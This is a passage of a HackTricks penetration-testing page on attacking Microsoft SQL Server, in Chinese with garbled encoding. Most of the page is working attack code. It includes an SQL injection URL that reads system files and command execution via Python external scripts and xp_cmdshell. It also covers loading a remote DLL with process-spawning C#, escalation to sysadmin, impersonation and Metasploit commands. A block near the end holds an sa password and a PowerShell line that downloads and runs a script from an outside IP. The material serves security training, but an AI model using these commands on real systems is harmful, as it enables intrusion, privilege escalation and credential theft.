<pre><code>https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--
</code></pre>
<h3 id="rceè¯»å–æ–‡ä»¶æ‰§è¡Œè„šæœ¬python-å’Œ-r"><a class="header" href="#rceè¯»å–æ–‡ä»¶æ‰§è¡Œè„šæœ¬python-å’Œ-r"><strong>RCE/è¯»å–æ–‡ä»¶æ‰§è¡Œè„šæœ¬ï¼ˆPython å’Œ Rï¼‰</strong></a></h3>
<p>MSSQL å¯èƒ½å…è®¸æ‚¨æ‰§è¡Œ <strong>Python å’Œ/æˆ– R çš„è„šæœ¬</strong>ã€‚è¿™äº›ä»£ç å°†ç”±ä¸ä½¿ç”¨ <strong>xp_cmdshell</strong> æ‰§è¡Œå‘½ä»¤çš„ <strong>ä¸åŒç”¨æˆ·</strong> æ‰§è¡Œã€‚</p>
<p>å°è¯•æ‰§è¡Œ <strong>'R'</strong> <em>"Hellow World!"</em> <strong>ä¸å·¥ä½œ</strong>ï¼š</p>
<p><img src="../../.gitbook/assets/image%20(393).png" alt="" /></p>
<p>ä½¿ç”¨é…ç½®çš„ Python æ‰§è¡Œå¤šä¸ªæ“ä½œçš„ç¤ºä¾‹ï¼š</p>
<pre><code class="language-sql"># Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
</code></pre>
<h3 id="è¯»å–æ³¨å†Œè¡¨"><a class="header" href="#è¯»å–æ³¨å†Œè¡¨">è¯»å–æ³¨å†Œè¡¨</a></h3>
<p>Microsoft SQL Server æä¾›äº† <strong>å¤šä¸ªæ‰©å±•å­˜å‚¨è¿‡ç¨‹</strong>ï¼Œå…è®¸æ‚¨ä¸ç½‘ç»œã€æ–‡ä»¶ç³»ç»Ÿç”šè‡³ <a href="https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/"><strong>Windows æ³¨å†Œè¡¨</strong></a>** è¿›è¡Œäº¤äº’ï¼š**</p>
<div class="table-wrapper"><table><thead><tr><th><strong>å¸¸è§„</strong></th><th><strong>å®ä¾‹æ„ŸçŸ¥</strong></th></tr></thead><tbody>
<tr><td>sys.xp_regread</td><td>sys.xp_instance_regread</td></tr>
<tr><td>sys.xp_regenumvalues</td><td>sys.xp_instance_regenumvalues</td></tr>
<tr><td>sys.xp_regenumkeys</td><td>sys.xp_instance_regenumkeys</td></tr>
<tr><td>sys.xp_regwrite</td><td>sys.xp_instance_regwrite</td></tr>
<tr><td>sys.xp_regdeletevalue</td><td>sys.xp_instance_regdeletevalue</td></tr>
<tr><td>sys.xp_regdeletekey</td><td>sys.xp_instance_regdeletekey</td></tr>
<tr><td>sys.xp_regaddmultistring</td><td>sys.xp_instance_regaddmultistring</td></tr>
<tr><td>sys.xp_regremovemultistring</td><td>sys.xp_instance_regremovemultistring</td></tr>
</tbody></table>
</div>
<pre><code class="language-sql"># Example read registry
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 'WorkingDirectory';
# Example write and then read registry
EXECUTE master.sys.xp_instance_regwrite 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue', 'REG_SZ', 'Now you see me!';
EXECUTE master.sys.xp_instance_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue';
# Example to check who can use these functions
Use master;
EXEC sp_helprotect 'xp_regread';
EXEC sp_helprotect 'xp_regwrite';
</code></pre>
<p>å¯¹äº<strong>æ›´å¤šç¤ºä¾‹</strong>ï¼Œè¯·æŸ¥çœ‹<a href="https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/"><strong>åŸå§‹æ¥æº</strong></a>ã€‚</p>
<h3 id="ä½¿ç”¨-mssql-ç”¨æˆ·å®šä¹‰å‡½æ•°è¿›è¡Œ-rce---sqlhttp"><a class="header" href="#ä½¿ç”¨-mssql-ç”¨æˆ·å®šä¹‰å‡½æ•°è¿›è¡Œ-rce---sqlhttp">ä½¿ç”¨ MSSQL ç”¨æˆ·å®šä¹‰å‡½æ•°è¿›è¡Œ RCE - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a></a></h3>
<p>å¯ä»¥<strong>åœ¨ MSSQL ä¸­é€šè¿‡è‡ªå®šä¹‰å‡½æ•°åŠ è½½ .NET dll</strong>ã€‚ä½†æ˜¯ï¼Œè¿™<strong>éœ€è¦ <code>dbo</code> è®¿é—®æƒé™</strong>ï¼Œå› æ­¤æ‚¨éœ€è¦ä»¥ <strong><code>sa</code> æˆ–ç®¡ç†å‘˜è§’è‰²</strong> è¿æ¥åˆ°æ•°æ®åº“ã€‚</p>
<p><a href="../../pentesting-web/sql-injection/mssql-injection.html#mssql-user-defined-function-sqlhttp"><strong>ç‚¹å‡»æ­¤é“¾æ¥</strong></a> æŸ¥çœ‹ç¤ºä¾‹ã€‚</p>
<h3 id="ä½¿ç”¨-autoadmin_task_agents-è¿›è¡Œ-rce"><a class="header" href="#ä½¿ç”¨-autoadmin_task_agents-è¿›è¡Œ-rce">ä½¿ç”¨ <code>autoadmin_task_agents</code> è¿›è¡Œ RCE</a></h3>
<p>æ ¹æ®<a href="https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"> <strong>è¿™ç¯‡æ–‡ç« </strong></a>ï¼Œä¹Ÿå¯ä»¥åŠ è½½è¿œç¨‹ dll å¹¶ä½¿ MSSQL æ‰§è¡Œå®ƒï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-sql">update autoadmin_task_agents set task_assembly_name = "class.dll", task_assembly_path="\\remote-server\\ping.dll",className="Class1.Class1";
</code></pre>
<p>{% endcode %}</p>
<p>ä¸ï¼š</p>
<pre><code class="language-csharp">using Microsoft.SqlServer.SmartAdmin;
using System;
using System.Diagnostics;

namespace Class1
{
public class Class1 : TaskAgent
{
public Class1()
{

Process process = new Process();
process.StartInfo.FileName = "cmd.exe";
process.StartInfo.Arguments = "/c ping localhost -t";
process.StartInfo.UseShellExecute = false;
process.StartInfo.RedirectStandardOutput = true;
process.Start();
process.WaitForExit();
}

public override void DoWork()
{

}

public override void ExternalJob(string command, LogBaseService jobLogger)
{

}

public override void Start(IServicesFactory services)
{

}

public override void Stop()
{

}


public void Test()
{

}
}
}
</code></pre>
<h3 id="å…¶ä»–-rce-æ–¹æ³•"><a class="header" href="#å…¶ä»–-rce-æ–¹æ³•">å…¶ä»– RCE æ–¹æ³•</a></h3>
<p>è¿˜æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥è·å–å‘½ä»¤æ‰§è¡Œï¼Œä¾‹å¦‚æ·»åŠ  <a href="https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server">æ‰©å±•å­˜å‚¨è¿‡ç¨‹</a>ã€<a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">CLR ç¨‹åºé›†</a>ã€<a href="https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15">SQL Server ä»£ç†ä½œä¸š</a> å’Œ <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql">å¤–éƒ¨è„šæœ¬</a>ã€‚</p>
<h2 id="mssql-æƒé™æå‡"><a class="header" href="#mssql-æƒé™æå‡">MSSQL æƒé™æå‡</a></h2>
<h3 id="ä»-db_owner-åˆ°-sysadmin"><a class="header" href="#ä»-db_owner-åˆ°-sysadmin">ä» db_owner åˆ° sysadmin</a></h3>
<p>å¦‚æœä¸€ä¸ª <strong>æ™®é€šç”¨æˆ·</strong> è¢«èµ‹äºˆ <strong><code>db_owner</code></strong> è§’è‰²åœ¨ <strong>ç”±ç®¡ç†å‘˜</strong> ç”¨æˆ·ï¼ˆå¦‚ <strong><code>sa</code></strong>ï¼‰æ‹¥æœ‰çš„ <strong>æ•°æ®åº“</strong> ä¸Šï¼Œå¹¶ä¸”è¯¥æ•°æ®åº“è¢«é…ç½®ä¸º <strong><code>trustworthy</code></strong>ï¼Œé‚£ä¹ˆè¯¥ç”¨æˆ·å¯ä»¥æ»¥ç”¨è¿™äº›æƒé™è¿›è¡Œ <strong>privesc</strong>ï¼Œå› ä¸ºåœ¨å…¶ä¸­åˆ›å»ºçš„ <strong>å­˜å‚¨è¿‡ç¨‹</strong> å¯ä»¥ä½œä¸ºæ‰€æœ‰è€…ï¼ˆ<strong>ç®¡ç†å‘˜</strong>ï¼‰ <strong>æ‰§è¡Œ</strong>ã€‚</p>
<pre><code class="language-sql"># Get owners of databases
SELECT suser_sname(owner_sid) FROM sys.databases

# Find trustworthy databases
SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;

# Get roles over the selected database (look for your username as db_owner)
USE &lt;trustworthy_db&gt;
SELECT rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)

# If you found you are db_owner of a trustworthy database, you can privesc:
--1. Create a stored procedure to add your user to sysadmin role
USE &lt;trustworthy_db&gt;

CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'USERNAME','sysadmin'

--2. Execute stored procedure to get sysadmin role
USE &lt;trustworthy_db&gt;
EXEC sp_elevate_me

--3. Verify your user is a sysadmin
SELECT is_srvrolemember('sysadmin')
</code></pre>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ä¸€ä¸ª <strong>metasploit</strong> æ¨¡å—ï¼š</p>
<pre><code class="language-bash">msf&gt; use auxiliary/admin/mssql/mssql_escalate_dbowner
</code></pre>
<p>æˆ–ä¸€ä¸ª <strong>PS</strong> è„šæœ¬ï¼š</p>
<pre><code class="language-powershell"># https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
</code></pre>
<h3 id="å†’å……å…¶ä»–ç”¨æˆ·"><a class="header" href="#å†’å……å…¶ä»–ç”¨æˆ·">å†’å……å…¶ä»–ç”¨æˆ·</a></h3>
<p>SQL Server æœ‰ä¸€ä¸ªç‰¹æ®Šæƒé™ï¼Œåä¸º <strong><code>IMPERSONATE</code></strong>ï¼Œå®ƒ <strong>å…è®¸æ‰§è¡Œç”¨æˆ·è·å–å¦ä¸€ä¸ªç”¨æˆ·æˆ–ç™»å½•çš„æƒé™</strong>ï¼Œç›´åˆ°ä¸Šä¸‹æ–‡è¢«é‡ç½®æˆ–ä¼šè¯ç»“æŸã€‚</p>
<pre><code class="language-sql"># Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

# If you can't find any users, make sure to check for links
enum_links
# If there is a link of interest, re-run the above steps on each link
use_link [NAME]
</code></pre>
<p>{% hint style="info" %}
å¦‚æœæ‚¨å¯ä»¥å†’å……ä¸€ä¸ªç”¨æˆ·ï¼Œå³ä½¿ä»–ä¸æ˜¯ sysadminï¼Œæ‚¨åº”è¯¥æ£€æŸ¥è¯¥ç”¨æˆ·æ˜¯å¦æœ‰æƒè®¿é—®å…¶ä»–æ•°æ®åº“æˆ–é“¾æ¥æœåŠ¡å™¨ã€‚
{% endhint %}</p>
<p>è¯·æ³¨æ„ï¼Œä¸€æ—¦æ‚¨æˆä¸º sysadminï¼Œæ‚¨å¯ä»¥å†’å……ä»»ä½•å…¶ä»–ç”¨æˆ·ï¼š</p>
<pre><code class="language-sql">-- Impersonate RegUser
EXECUTE AS LOGIN = 'RegUser'
-- Verify you are now running as the the MyUser4 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Change back to sa
REVERT
</code></pre>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ <strong>metasploit</strong> æ¨¡å—æ‰§è¡Œæ­¤æ”»å‡»ï¼š</p>
<pre><code class="language-bash">msf&gt; auxiliary/admin/mssql/mssql_escalate_execute_as
</code></pre>
<p>æˆ–ä½¿ç”¨ <strong>PS</strong> è„šæœ¬ï¼š</p>
<pre><code class="language-powershell"># https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 10.2.9.101 -SqlUser myuser1 -SqlPass MyPassword!
</code></pre>
<h2 id="ä½¿ç”¨-mssql-è¿›è¡ŒæŒä¹…åŒ–"><a class="header" href="#ä½¿ç”¨-mssql-è¿›è¡ŒæŒä¹…åŒ–">ä½¿ç”¨ MSSQL è¿›è¡ŒæŒä¹…åŒ–</a></h2>
<p><a href="https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/">https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/</a></p>
<h2 id="ä»-sql-server-è¿æ¥æœåŠ¡å™¨æå–å¯†ç "><a class="header" href="#ä»-sql-server-è¿æ¥æœåŠ¡å™¨æå–å¯†ç ">ä» SQL Server è¿æ¥æœåŠ¡å™¨æå–å¯†ç </a></h2>
<p>æ”»å‡»è€…å¯ä»¥ä» SQL å®ä¾‹ä¸­æå– SQL Server è¿æ¥æœåŠ¡å™¨çš„å¯†ç ï¼Œå¹¶ä»¥æ˜æ–‡å½¢å¼è·å–å®ƒä»¬ï¼Œä»è€Œæˆäºˆæ”»å‡»è€…å¯ä»¥ç”¨äºåœ¨ç›®æ ‡ä¸Šè·å¾—æ›´å¤§ç«‹è¶³ç‚¹çš„å¯†ç ã€‚æå–å’Œè§£å¯†å­˜å‚¨åœ¨è¿æ¥æœåŠ¡å™¨ä¸­çš„å¯†ç çš„è„šæœ¬å¯ä»¥åœ¨ <a href="https://www.richardswinbank.net/admin/extract_linked_server_passwords">è¿™é‡Œ</a> æ‰¾åˆ°ã€‚</p>
<p>ä¸ºäº†ä½¿æ­¤æ¼æ´åˆ©ç”¨æœ‰æ•ˆï¼Œå¿…é¡»è¿›è¡Œä¸€äº›è¦æ±‚å’Œé…ç½®ã€‚é¦–å…ˆï¼Œæ‚¨å¿…é¡»åœ¨æœºå™¨ä¸Šå…·æœ‰ç®¡ç†å‘˜æƒé™ï¼Œæˆ–èƒ½å¤Ÿç®¡ç† SQL Server é…ç½®ã€‚</p>
<p>éªŒè¯æƒé™åï¼Œæ‚¨éœ€è¦é…ç½®ä»¥ä¸‹ä¸‰é¡¹å†…å®¹ï¼š</p>
<ol>
<li>åœ¨ SQL Server å®ä¾‹ä¸Šå¯ç”¨ TCP/IPï¼›</li>
<li>æ·»åŠ å¯åŠ¨å‚æ•°ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°†æ·»åŠ ä¸€ä¸ªè·Ÿè¸ªæ ‡å¿—ï¼Œå³ -T7806ã€‚</li>
<li>å¯ç”¨è¿œç¨‹ç®¡ç†å‘˜è¿æ¥ã€‚</li>
</ol>
<p>è¦è‡ªåŠ¨åŒ–è¿™äº›é…ç½®ï¼Œ<a href="https://github.com/IamLeandrooooo/SQLServerLinkedServersPasswords/">è¿™ä¸ªä»“åº“</a>æä¾›äº†æ‰€éœ€çš„è„šæœ¬ã€‚é™¤äº†ä¸ºæ¯ä¸ªé…ç½®æ­¥éª¤æä¾› PowerShell è„šæœ¬å¤–ï¼Œè¯¥ä»“åº“è¿˜æä¾›äº†ä¸€ä¸ªå®Œæ•´çš„è„šæœ¬ï¼Œç»“åˆäº†é…ç½®è„šæœ¬ä»¥åŠå¯†ç çš„æå–å’Œè§£å¯†ã€‚</p>
<p>æœ‰å…³æ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ä»¥ä¸‹é“¾æ¥ï¼š<a href="https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-database-link-server-passwords/">è§£å¯† MSSQL æ•°æ®åº“é“¾æ¥æœåŠ¡å™¨å¯†ç </a></p>
<p><a href="https://www.mssqltips.com/sqlservertip/5364/troubleshooting-the-sql-server-dedicated-administrator-connection/">æ’é™¤ SQL Server ä¸“ç”¨ç®¡ç†å‘˜è¿æ¥æ•…éšœ</a></p>
<h2 id="æœ¬åœ°æƒé™æå‡"><a class="header" href="#æœ¬åœ°æƒé™æå‡">æœ¬åœ°æƒé™æå‡</a></h2>
<p>è¿è¡Œ MSSQL æœåŠ¡å™¨çš„ç”¨æˆ·å°†å¯ç”¨ç‰¹æƒä»¤ç‰Œ <strong>SeImpersonatePrivilege.</strong><br />
æ‚¨å¯èƒ½èƒ½å¤Ÿé€šè¿‡ä»¥ä¸‹ä¸¤ä¸ªé¡µé¢ä¹‹ä¸€ <strong>æå‡åˆ°ç®¡ç†å‘˜</strong>ï¼š</p>
<p>{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md" %}
<a href="../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html">roguepotato-and-printspoofer.md</a>
{% endcontent-ref %}</p>
<p>{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/juicypotato.md" %}
<a href="../../windows-hardening/windows-local-privilege-escalation/juicypotato.html">juicypotato.md</a>
{% endcontent-ref %}</p>
<h2 id="shodan"><a class="header" href="#shodan">Shodan</a></h2>
<ul>
<li><code>port:1433 !HTTP</code></li>
</ul>
<h2 id="å‚è€ƒæ–‡çŒ®"><a class="header" href="#å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</a></h2>
<ul>
<li><a href="https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users">https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users</a></li>
<li><a href="https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/">https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/</a></li>
<li><a href="https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/">https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/</a></li>
<li><a href="https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/">https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/</a></li>
<li><a href="https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/">https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/</a></li>
<li><a href="https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/">https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/</a></li>
<li><a href="https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/">https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/</a></li>
<li><a href="https://mayfly277.github.io/posts/GOADv2-pwning-part12/">https://mayfly277.github.io/posts/GOADv2-pwning-part12/</a></li>
<li><a href="https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp</a></li>
</ul>
<h2 id="hacktricks-è‡ªåŠ¨å‘½ä»¤"><a class="header" href="#hacktricks-è‡ªåŠ¨å‘½ä»¤">HackTricks è‡ªåŠ¨å‘½ä»¤</a></h2>
<pre><code>Protocol_Name: MSSQL    #Protocol Abbreviation if there is one.
Port_Number:  1433     #Comma separated if there is more than one.
Protocol_Description: Microsoft SQL Server         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MSSQL
Note: |
Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applicationsâ€”which may run either on the same computer or on another computer across a network (including the Internet).

#sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G

###the goal is to get xp_cmdshell working###
1. try and see if it works
xp_cmdshell `whoami`
go

2. try to turn component back on
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell `whoami`
go

3. 'advanced' turn it back on
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go




xp_cmdshell "powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')"


https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server

Entry_2:
Name: Nmap for SQL
Description: Nmap with SQL Scripts
Command: nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}

Entry_3:
Name: MSSQL consolesless mfs enumeration
Description: MSSQL enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT &lt;PORT&gt;; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT &lt;PORT&gt;; run; exit' &amp;&amp; msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT &lt;PORT&gt;; run; exit' &amp;&amp;msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT &lt;PORT&gt;; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT &lt;PORT&gt;; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT &lt;PORT&gt;; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT &lt;PORT&gt;; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT &lt;PORT&gt;; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT &lt;PORT&gt;; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT &lt;PORT&gt;; run; exit'

</code></pre>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../network-services-pentesting/1414-pentesting-ibmmq.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/types-of-mssql-users.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../network-services-pentesting/1414-pentesting-ibmmq.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/types-of-mssql-users.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
